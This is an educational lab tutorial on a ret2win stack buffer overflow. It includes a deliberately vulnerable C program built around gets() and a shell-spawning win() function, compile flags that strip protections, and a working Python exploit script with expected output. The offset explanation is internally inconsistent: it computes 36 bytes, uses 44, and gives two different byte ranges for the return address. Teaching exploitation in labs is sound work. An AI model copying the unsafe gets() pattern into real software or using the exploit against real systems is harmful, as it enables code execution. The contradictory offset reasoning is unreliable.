# Lab 2: picoCTF Buffer Overflow - ret2win Attack

**Time:** 30-40 minutes  
**Difficulty:** Intermediate  
**Goal:** Overflow a buffer to redirect program execution to a hidden function

---

## Introduction

In Lab 1, you learned to overflow a buffer and change a variable.

In Lab 2, you'll learn to:
- Overflow a buffer to overwrite the **return address**
- Redirect program execution to a function that's never called normally
- This is called a "ret2win" (return-to-win) attack

**The concept:** When a function finishes, it looks at the return address on the stack to know where to go next. If you overwrite that address, you control where the program goes.

---

## The Vulnerable Program

**Location:** `vulnerable-programs/lab2-picoctf/vuln.c`
```c
#include <stdio.h>
#include <stdlib.h>

void win() {
    puts("Congratulations! You redirected execution to win()");
    puts("This is a classic ret2win attack.");
    system("/bin/sh");
}

void vulnerable() {
    char buffer[32];
    puts("What's your name?");
    gets(buffer);
    printf("Hello, %s!\n", buffer);
}

int main() {
    setbuf(stdout, NULL);
    setbuf(stdin, NULL);
    puts("Welcome to picoCTF Buffer Overflow 1");
    vulnerable();
    puts("Exiting normally...");
    return 0;
}
```

**What this program does:**

1. `main()` calls `vulnerable()`
2. `vulnerable()` creates a 32-byte buffer
3. `gets(buffer)` reads input - **NO size checking!**
4. Prints your input
5. Returns to `main()`
6. `main()` prints "Exiting normally..."

**The hidden function:**

Notice `win()` is NEVER called in the code! It just sits there. Our goal: make the program call `win()` by overwriting the return address.

---

## Understanding Return Addresses

**How functions work:**

When `main()` calls `vulnerable()`:
1. Current position is saved (return address)
2. Jump to `vulnerable()`
3. Execute `vulnerable()`
4. Read return address from stack
5. Jump back to `main()`

**Stack layout when inside `vulnerable()`:**
```
Higher addresses
┌────────────────────┐
│ Return Address     │  ← Where to go after vulnerable() ends
├────────────────────┤
│ Saved EBP          │  ← Previous stack frame pointer (4 bytes)
├────────────────────┤
│ buffer[0-31]       │  ← Our 32-byte buffer
└────────────────────┘
Lower addresses
```

**Normal execution:**
```
vulnerable() finishes
    ↓
Reads return address → Points to main()
    ↓
Returns to main()
    ↓
Prints "Exiting normally..."
```

**After our attack:**
```
vulnerable() finishes
    ↓
Reads return address → Points to win()!
    ↓
Jumps to win()
    ↓
Prints success + spawns shell
```

---

## Setup

### Compile the Vulnerable Program
```bash
cd vulnerable-programs/lab2-picoctf
gcc -m32 -fno-stack-protector -no-pie -o vuln vuln.c
```

**Compilation flags:**
- `-m32`: 32-bit (simpler addresses)
- `-fno-stack-protector`: Disable stack canaries
- `-no-pie`: Disable address randomization

### Test Normal Execution
```bash
./vuln
```

Type: `Hello`

**Result:**
```
Welcome to picoCTF Buffer Overflow 1
What's your name?
Hello, Hello!
Exiting normally...
```

Notice: `win()` never runs, program exits normally.

---

## Finding the win() Address

We need to know WHERE `win()` is in memory. Use `objdump`:
```bash
objdump -d vuln | grep "<win>"
```

**Example output:**
```
080491d6 <win>:
```

**Write this down:** `0x080491d6` (your address might be different!)

This is the memory address where `win()` starts.

---

## Calculating the Offset

We need to know how many bytes to send before we start overwriting the return address.

**The layout:**
```
[ buffer: 32 bytes ] [ saved EBP: 4 bytes ] [ return address: 4 bytes ]
```

**Calculation:**
- Buffer: 32 bytes
- Saved EBP: 4 bytes
- Total offset to return address: 32 + 4 = 36 bytes

But let's verify this with testing.

### Finding the Offset (Pattern Method)

Create a unique pattern to find exactly where overflow happens:
```bash
# Generate 60 bytes of unique pattern
python3 -c "import sys; sys.stdout.buffer.write(b'A'*32 + b'B'*4 + b'C'*4 + b'D'*20)" | ./vuln
```

If the program crashes at address 0x43434343 (CCCC), then the return address is at offset 36 (32 A's + 4 B's + 4 C's).

**Common offsets:**
- 32-byte buffer typically needs 36-44 bytes to reach return address
- Try 36, 40, 44 if unsure

---

## Creating the Exploit

**Location:** `exploits/lab2-picoctf/exploit.py`
```python
#!/usr/bin/env python3
import sys
from struct import pack

# STEP 1: Find win() address using objdump
win_addr = 0x080491d6  # Replace with YOUR address from objdump!

# STEP 2: Calculate offset to return address
# Buffer: 32 bytes
# Saved EBP: 4 bytes
# Return address starts at byte 36
offset = 44  # Total bytes to reach return address

# STEP 3: Build the payload
payload = b"A" * offset           # Fill buffer + saved EBP
payload += pack("<I", win_addr)   # Overwrite return address with win()

# STEP 4: Output payload
sys.stdout.buffer.write(payload)
```

**How this works:**

1. **Fill the buffer:** 44 bytes of 'A' fills the buffer and saved EBP
2. **Overwrite return address:** Next 4 bytes overwrite the return address
3. **Pack the address:** `pack("<I", addr)` converts address to little-endian bytes
   - Little-endian: 0x080491d6 becomes `\xd6\x91\x04\x08`

**Why little-endian?**

x86 processors store addresses backwards (least significant byte first):
- Address: 0x080491d6
- Stored as: d6 91 04 08

---

## Running the Exploit
```bash
cd exploits/lab2-picoctf
python3 exploit.py | ../../vulnerable-programs/lab2-picoctf/vuln
```

**Expected output:**
```
Welcome to picoCTF Buffer Overflow 1
What's your name?
Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�!
Congratulations! You redirected execution to win()
This is a classic ret2win attack.
```

**Success!** The program called `win()` even though it's never called in the code.

---

## Understanding What Happened

**Step-by-step execution:**

1. `main()` calls `vulnerable()`
2. `vulnerable()` creates stack frame:
```
   [ buffer: 32 bytes ] [ saved EBP: 4 bytes ] [ return addr: 4 bytes ]
```
3. `gets(buffer)` reads our 48-byte payload:
```
   [ 44 A's          ] [ 0x080491d6 (win address) ]
```
4. Buffer overflow occurs:
   - Bytes 0-31: Fill buffer
   - Bytes 32-35: Overwrite saved EBP
   - Bytes 36-39: Overwrite return address with 0x080491d6
   - Bytes 40-43: Extra padding
   - Bytes 44-47: Our win() address
5. `vulnerable()` finishes and reads return address
6. Instead of returning to `main()`, it jumps to `win()`
7. `win()` executes: prints success message

---

## Common Problems and Solutions

### Problem 1: Segmentation Fault

**Symptoms:**
```
Segmentation fault (core dumped)
```

**Causes:**
- Wrong offset (return address not properly overwritten)
- Wrong win() address
- Incorrect byte order (endianness)

**Solutions:**

1. **Verify win() address:**
```bash
   objdump -d vuln | grep "<win>"
```

2. **Try different offsets:**
```python
   # Try these offsets: 36, 40, 44
   offset = 44  # Adjust this value
```

3. **Check your payload structure:**
```python
   # Should be: padding + address
   payload = b"A" * offset + pack("<I", win_addr)
```

### Problem 2: "Exiting normally..." Still Prints

**Symptom:**
Program runs normally, doesn't call win()

**Cause:**
Return address not overwritten - offset too small

**Solution:**
Increase offset:
```python
offset = 44  # Try 44 instead of 36
```

### Problem 3: Wrong Address Format

**Symptom:**
Program crashes or behaves unexpectedly

**Cause:**
Address not in little-endian format

**Solution:**
Always use `pack("<I", address)`:
```python
from struct import pack
payload += pack("<I", win_addr)  # Correct
# NOT: payload += win_addr  # Wrong!
```

---

## Visualizing the Attack

**Before overflow:**
```
Stack Memory:
0xffffd000: [ buffer: "Hello\0" + empty space (32 bytes) ]
0xffffd020: [ saved EBP: 0xffffd038 ]
0xffffd024: [ return address: 0x08049256 (points to main) ]
```

**After overflow:**
```
Stack Memory:
0xffffd000: [ buffer: "AAAAAAAAAA..." (44 A's fill everything) ]
0xffffd020: [ saved EBP: 0x41414141 (AAAA - overwritten!) ]
0xffffd024: [ return address: 0x080491d6 (now points to win!) ]
```

**When vulnerable() returns:**
```
Normal:     return to main() at 0x08049256 → "Exiting normally..."
After hack: return to win() at 0x080491d6 → Success message!
```

---

## Key Concepts

### What is a Return Address?

Every time a function is called, the CPU:
1. Saves the current position (return address) on the stack
2. Jumps to the function
3. When done, reads the return address
4. Jumps back to that address

**Return address = "Where to go when this function ends"**

### What is ret2win?

"ret2win" = "return to win function"

A type of exploit where you:
1. Overflow a buffer
2. Overwrite the return address
3. Point it to a function you want to execute
4. Function returns to your chosen location

### Why Does This Work?

The program **blindly trusts** the return address on the stack:
- Doesn't verify it's valid
- Doesn't check if it was modified
- Just jumps wherever it points

**This is why modern systems use stack canaries - to detect if the stack was modified.**

### What is Little-Endian?

x86 processors store multi-byte values backwards:

**Big-endian (human-readable):**
```
Address 0x080491d6 stored as: 08 04 91 d6
```

**Little-endian (x86):**
```
Address 0x080491d6 stored as: d6 91 04 08
```

Always use `pack("<I", addr)` to convert properly!

---

## Experimenting

### Experiment 1: Different Offsets

Try finding the exact offset:
```python
#!/usr/bin/env python3
import sys
from struct import pack

win_addr = 0x080491d6  # Your address

# Try different offsets
for offset in [36, 40, 44, 48]:
    print(f"Testing offset: {offset}")
    payload = b"A" * offset + pack("<I", win_addr)
    # Test this payload
```

### Experiment 2: Invalid Addresses

See what happens with wrong addresses:
```python
# Try invalid address
win_addr = 0xdeadbeef
payload = b"A" * 44 + pack("<I", win_addr)
# Should crash - no code at 0xdeadbeef
```

### Experiment 3: Finding Offset with GDB
```bash
gdb vuln
(gdb) break vulnerable
(gdb) run
(gdb) print &buffer
(gdb) info frame
# Calculate: frame_return_address - buffer_address
```

---

## Testing Defenses

See how defenses prevent this attack:
```bash
cd ../../secure-versions/lab2-picoctf-secure
./COMPILE_ALL.sh
./test_defenses.sh
```

**Results:**
- v1 (Safe Code): Input validation prevents overflow
- v2 (Stack Canary): Detects stack corruption, aborts
- v3 (All Defenses): Multiple layers block attack

**Read:** `DEFENSE_COMPARISON.md` to understand each defense.

---

## What You Learned

**Technical skills:**
- How return addresses work
- How to find function addresses (objdump)
- How to calculate stack offsets
- How to pack addresses in little-endian format
- How to redirect program execution

**Security concepts:**
- Control flow hijacking
- Return-oriented attacks
- Why stack canaries exist
- Why ASLR (address randomization) matters
- Importance of bounds checking

**Exploit development:**
- Finding target addresses
- Calculating buffer offsets
- Constructing payloads
- Testing and debugging exploits

---

## Comparison with Lab 1

| Aspect | Lab 1 | Lab 2 |
|--------|-------|-------|
| Target | Adjacent variable | Return address |
| Goal | Change value | Redirect execution |
| Bytes needed | 65 (64 + 1) | 48 (44 + 4) |
| What we control | Variable value | Program flow |
| Difficulty | Beginner | Intermediate |

---

## Next Steps

**Lab 3 (SEED Labs):** Learn to inject and execute your own code (shellcode injection)

In Lab 3, you'll go beyond calling existing functions and actually inject your own machine code.

---

## Summary

**The vulnerability:**
- `gets()` allows unbounded input
- Buffer overflow reaches return address
- Return address controls where program goes next

**The exploit:**
1. Fill buffer (32 bytes)
2. Overwrite saved EBP (4 bytes)  
3. Overwrite return address with win() address (4 bytes)
4. Program returns to win() instead of main()

**The lesson:**
- Never trust stack data
- Always use stack canaries in production
- Input validation alone isn't enough for security

Congratulations on completing Lab 2!
